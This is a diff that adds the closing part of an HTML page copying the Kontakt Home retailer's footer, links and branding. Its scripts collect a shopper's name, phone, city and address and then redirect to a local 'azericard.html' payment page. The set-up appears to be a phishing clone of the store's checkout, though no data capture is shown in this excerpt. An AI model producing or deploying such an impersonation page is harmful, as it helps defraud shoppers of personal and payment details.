+                                        <path d="M33.333 11.8268L32.9955 10.0871H29.2245L28.6245 11.8144L25.602 11.8206C27.0409 8.25331 28.4829 4.68733 29.928 1.12268C30.174 0.518041 30.6105 0.21031 31.254 0.213403C31.746 0.218042 32.5485 0.218041 33.663 0.214948L36 11.8222L33.333 11.8268ZM30.0735 7.70412H32.5035L31.596 3.3433L30.0735 7.70412ZM10.59 0.211856L13.629 0.214948L8.931 11.8284L5.8545 11.8253C5.08087 8.75771 4.31687 5.68759 3.5625 2.61495C3.4125 2.00258 3.1155 1.57423 2.544 1.37165C1.69984 1.08004 0.851754 0.800629 0 0.533506L0 0.216495H4.8555C5.6955 0.216495 6.186 0.635567 6.3435 1.49536C6.5025 2.3567 6.9015 4.54948 7.5435 8.07371L10.59 0.211856ZM17.805 0.214948L15.402 11.8253L12.51 11.8222L14.91 0.211856L17.805 0.214948V0.214948ZM23.67 0C24.5355 0 25.626 0.278351 26.253 0.533506L25.746 2.94124C25.179 2.70619 24.246 2.38918 23.4615 2.4C22.3215 2.4201 21.6165 2.9134 21.6165 3.3866C21.6165 4.1567 22.8405 4.54484 24.1005 5.38608C25.539 6.34484 25.728 7.20619 25.71 8.14175C25.6905 10.084 24.1005 12 20.7465 12C19.2165 11.9768 18.6645 11.8438 17.4165 11.3876L17.9445 8.87474C19.215 9.42371 19.7535 9.59845 20.8395 9.59845C21.834 9.59845 22.6875 9.18402 22.695 8.46186C22.701 7.94845 22.395 7.6933 21.279 7.05928C20.163 6.42371 18.597 5.54381 18.618 3.77783C18.6435 1.51701 20.721 0 23.6715 0H23.67Z" fill="#323232"></path>
+                                    </svg>
+                                </span>
+                                <span>
+                                    <svg width="30" height="18" viewBox="0 0 30 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M14.9995 1.87205C16.0791 2.71945 16.9517 3.80132 17.5514 5.03579C18.1511 6.27026 18.4621 7.62497 18.4609 8.99738C18.4617 10.3694 18.1505 11.7235 17.5508 12.9575C16.9512 14.1915 16.0787 15.2729 14.9995 16.1201C13.9201 15.2728 13.0476 14.1911 12.4479 12.9569C11.8483 11.7227 11.5372 10.3682 11.5382 8.99605C11.5372 7.62386 11.8483 6.26941 12.4479 5.03519C13.0476 3.80097 13.9201 2.71931 14.9995 1.87205V1.87205ZM13.8395 1.09605C12.6968 2.07148 11.7795 3.28341 11.151 4.64809C10.5226 6.01276 10.1979 7.49762 10.1995 9.00005C10.198 10.5018 10.5224 11.986 11.1504 13.3502C11.7784 14.7144 12.6949 15.926 13.8369 16.9014C12.4574 17.6758 10.8992 18.0756 9.3173 18.0612C7.73538 18.0468 6.18479 17.6186 4.81965 16.8192C3.45451 16.0198 2.32238 14.877 1.53579 13.5044C0.749193 12.1318 0.335537 10.5773 0.335938 8.9953C0.336338 7.41332 0.750781 5.85899 1.53807 4.48682C2.32536 3.11465 3.45807 1.97243 4.82361 1.1737C6.18915 0.374971 7.73996 -0.052448 9.32189 -0.0660701C10.9038 -0.0796923 12.4618 0.320957 13.8408 1.09605H13.8395ZM16.1622 16.9014C17.3041 15.926 18.2207 14.7144 18.8487 13.3502C19.4767 11.986 19.8011 10.5018 19.7995 9.00005C19.8011 7.49762 19.4765 6.01276 18.848 4.64809C18.2195 3.28341 17.3022 2.07148 16.1595 1.09605C17.5386 0.320957 19.0966 -0.0796923 20.6785 -0.0660701C22.2604 -0.052448 23.8112 0.374971 25.1768 1.1737C26.5423 1.97243 27.675 3.11465 28.4623 4.48682C29.2496 5.85899 29.664 7.41332 29.6644 8.9953C29.6648 10.5773 29.2512 12.1318 28.4646 13.5044C27.678 14.877 26.5459 16.0198 25.1807 16.8192C23.8156 17.6186 22.265 18.0468 20.6831 18.0612C19.1011 18.0756 17.543 17.6758 16.1635 16.9014H16.1622Z" fill="#323232"></path>
+                                    </svg>
+                                </span>
+                            </div>
+                        </div>
+                        <div class="footItem footItem--2">
+                            <div class="footItem__title">Kontakt</div>
+                            <ul>
+                                <li><a href="https://kontakt.az/sirket-haqqinda">Şirkət haqqında</a></li>
+                                <li><a target="_blank" href="https://glorri.com/jobs/abc-telecom">Karyera</a></li>
+                                <li><a href="https://kontakt.az/qarabag-proqrami">"Qarabağ" proqramı</a></li>
+                                <li><a target="_blank" href="https://www.youtube.com/c/KontaktHome-TV">Kontakt Video</a>
+                                </li>
+                                <li><a target="_blank" href="https://kontakttv.az/az">Kontakt TV</a></li>
+                            </ul>
+                        </div>
+                        <div class="footItem footItem--2">
+                            <div class="footItem__title">Məlumat</div>
+                            <ul>
+                                <li><a href="https://kontakt.az/konfidensialliq-siyaseti">Konfidensiallıq siyasəti</a>
+                                </li>
+                                <li><a href="https://kontakt.az/qiymet-siyaseti">Qiymət siyasəti</a></li>
+                                <li><a href="https://kontakt.az/sikayetlerin-idare-olunma-siyaseti">Şikayətlərin
+                                        idarəolunması siyasəti</a></li>
+                                <li><a href="https://kontakt.az/saytin-istifade-sertleri">Saytın istifadə şərtləri</a>
+                                </li>
+                                <li><a href="https://kontakt.az/en-yaxsi-qiymete-zemanet">Ən yaxşı qiymətə zəmanət!</a>
+                                </li>
+                                <li><a href="https://kontakt.az/korporativ-satislar">Korporativ satışlar</a></li>
+                            </ul>
+                        </div>
+                        <div class="footItem footItem--3">
+                            <div class="footItem__title">Müştərilər üçün</div>
+                            <ul>
+                                <li><a href="https://kontakt.az/trade-in">Trade-in</a></li>
+                                <li><a href="https://kontakt.az/catdirilma-ve-odeme">Çatdırılma və ödəmə</a></li>
+                                <li><a href="https://kontakt.az/hisse-hisse-odenis-sertleri">Hissə-hissə ödəniş
+                                        şərtləri</a></li>
+                                <li><a href="https://kontakt.az/geri-qaytarma-siyaseti">Geri qaytarma siyasəti</a></li>
+                                <li><a href="https://kontakt.az/zemanetler">Zəmanətlər</a></li>
+                                <li><a href="https://kontakt.az/onlayn-sifaris-et-naxcivana-pulsuz-catdiraq">Naxçıvana
+                                        çatdırılma</a></li>
+                                <li><a href="https://kontakt.az/ayliq-odenislerin-heyata-kecirilmesi">Aylıq ödənişlərin
+                                        həyata keçirilməsi</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="footItem__title">Bizimlə qalın:</div>
+                    <div class="social">
+                        <a href="https://www.instagram.com/_kontakthome.az/?hl=en/" target="_blank" rel="nofollow noopener noreferrer">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M11.9968 7.9983C9.79333 7.9983 7.99515 9.79651 7.99515 12C7.99515 14.2035 9.79333 16.0017 11.9968 16.0017C14.2002 16.0017 15.9984 14.2035 15.9984 12C15.9984 9.79651 14.2002 7.9983 11.9968 7.9983ZM23.9987 12C23.9987 10.3429 24.0137 8.70077 23.9206 7.04665C23.8275 5.12536 23.3893 3.4202 21.9843 2.01525C20.5764 0.607302 18.8743 0.172008 16.953 0.0789456C15.2959 -0.0141173 13.6539 0.000892936 11.9998 0.000892936C10.3427 0.000892936 8.70061 -0.0141173 7.04652 0.0789456C5.12526 0.172008 3.42014 0.610305 2.01522 2.01525C0.607291 3.42321 0.172005 5.12536 0.0789442 7.04665C-0.014117 8.70377 0.000892919 10.3459 0.000892919 12C0.000892919 13.6541 -0.014117 15.2992 0.0789442 16.9533C0.172005 18.8746 0.610293 20.5798 2.01522 21.9847C3.42314 23.3927 5.12526 23.828 7.04652 23.9211C8.70361 24.0141 10.3457 23.9991 11.9998 23.9991C13.6569 23.9991 15.2989 24.0141 16.953 23.9211C18.8743 23.828 20.5794 23.3897 21.9843 21.9847C23.3923 20.5768 23.8275 18.8746 23.9206 16.9533C24.0167 15.2992 23.9987 13.6571 23.9987 12ZM11.9968 18.1572C8.58954 18.1572 5.83973 15.4073 5.83973 12C5.83973 8.5927 8.58954 5.84284 11.9968 5.84284C15.404 5.84284 18.1538 8.5927 18.1538 12C18.1538 15.4073 15.404 18.1572 11.9968 18.1572ZM18.406 7.02864C17.6105 7.02864 16.968 6.38621 16.968 5.59067C16.968 4.79513 17.6105 4.1527 18.406 4.1527C19.2015 4.1527 19.8439 4.79513 19.8439 5.59067C19.8442 5.77957 19.8071 5.96667 19.735 6.14124C19.6628 6.31581 19.5569 6.47442 19.4233 6.608C19.2897 6.74157 19.1311 6.84748 18.9565 6.91967C18.782 6.99185 18.5949 7.02888 18.406 7.02864Z" fill="#323232"></path>
+                            </svg>
+                        </a>
+                        <a href="https://wa.me/994517769705?text=" target="_blank" rel="nofollow noopener noreferrer">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M22.2051 5.54986C18.615 -0.000183464 11.2852 -1.6502 5.60089 1.79983C0.0661373 5.24986 -1.72892 12.7499 1.86119 18.3L2.16037 18.75L0.963664 23.25L5.4513 22.05L5.90006 22.35C7.8447 23.4 9.93893 24 12.0332 24C14.277 24 16.5208 23.4 18.4654 22.2C24.0002 18.6 25.6456 11.2499 22.2051 5.54986ZM19.0638 17.0999C18.4654 18 17.7175 18.6 16.6704 18.75C16.072 18.75 15.3241 19.05 12.3323 17.85C9.78934 16.6499 7.69511 14.6999 6.19924 12.4499C5.30171 11.3999 4.85295 10.0499 4.70336 8.69988C4.70336 7.49987 5.15212 6.44987 5.90006 5.69986C6.19924 5.39986 6.49841 5.24986 6.79759 5.24986H7.54553C7.8447 5.24986 8.14388 5.24986 8.29347 5.84986C8.59264 6.59987 9.34058 8.39988 9.34058 8.54988C9.49017 8.69988 9.49017 8.99989 9.34058 9.14989C9.49017 9.44989 9.34058 9.74989 9.19099 9.89989C9.04141 10.0499 8.89182 10.3499 8.74223 10.4999C8.44305 10.6499 8.29347 10.9499 8.44305 11.2499C9.0414 12.1499 9.78934 13.0499 10.5373 13.7999C11.4348 14.5499 12.3323 15.1499 13.3794 15.5999C13.6786 15.7499 13.9778 15.7499 14.1274 15.4499C14.277 15.1499 15.0249 14.3999 15.3241 14.0999C15.6233 13.7999 15.7729 13.7999 16.072 13.9499L18.4654 15.1499C18.7646 15.2999 19.0638 15.4499 19.2134 15.5999C19.363 16.0499 19.363 16.6499 19.0638 17.0999Z" fill="#323232"></path>
+                            </svg>
+                        </a>
+                    </div>
+                </div>
+            </div>
+    </footer></div>
+    <div class="foot__bottom">
+        <div class="foot__bottom">© Kontakt Home 2025</div>
+    </div>
+    
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const color = urlParams.get('color');
+    const phoneColorSpan = document.getElementById('phone-color');
+    const phoneImage = document.getElementById('phone-image');
+    if (color === 'silver') {
+        if (phoneColorSpan) phoneColorSpan.textContent = 'Silver';
+        if (phoneImage) phoneImage.src = 'https://kontakt.az/media/catalog/product/cache/ec3348cd707f11bd7a951e83328510dc/t/m/tm-dg-sbp-1105-sm-1978_1.png';
+    } else if (color === 'gold') {
+        if (phoneColorSpan) phoneColorSpan.textContent = 'Gold';
+        if (phoneImage) phoneImage.src = 'https://kontakt.az/media/catalog/product/cache/ec3348cd707f11bd7a951e83328510dc/d/3/d3r3r2r3_1.png';
+    } else if (color === 'spaceblack') {
+        if (phoneColorSpan) phoneColorSpan.textContent = 'Space Black';
+        if (phoneImage) phoneImage.src = 'https://kontakt.az/media/catalog/product/cache/ec3348cd707f11bd7a951e83328510dc/t/m/tm-dg-sbp-1105-sm-1976.png';
+    }
+</script>
+
+<script>
+    const phoneInput = document.getElementById('phone');
+    IMask(phoneInput, {
+        mask: '+994 (00) 000 00 00'
+    });
+    function restrictToLetters(event) {
+        const charCode = event.which || event.keyCode;
+        const charStr = String.fromCharCode(charCode);
+        if (!/^[a-zA-Z\u0400-\u04FF\s]+$/.test(charStr) && charCode !== 8 && charCode !== 32) {
+            event.preventDefault();
+        }
+    }
+    const nameInput = document.getElementById('name');
+    const lastnameInput = document.getElementById('lastname');
+    nameInput.addEventListener('keypress', restrictToLetters);
+    lastnameInput.addEventListener('keypress', restrictToLetters);
+    function checkFormAndRedirect() {
+        const inputs = ['name', 'lastname', 'phone', 'city', 'address'];
+        let isValid = true;
+
+        inputs.forEach(id => {
+            const element = document.getElementById(id);
+            if (!element.value.trim()) {
+                isValid = false;
+            }
+        });
+
+        if (!isValid) {
+            alert('Məlumatları tam daxil edin!');
+        } else {
+            window.location.href = 'azericard.html';
+        }
+    }
+
+    document.getElementById('complete1').addEventListener('click', checkFormAndRedirect);
+    document.getElementById('complete2').addEventListener('click', checkFormAndRedirect);
+    document.getElementById('complete3').addEventListener('click', checkFormAndRedirect);
+</script>
+
+
+</body></html>
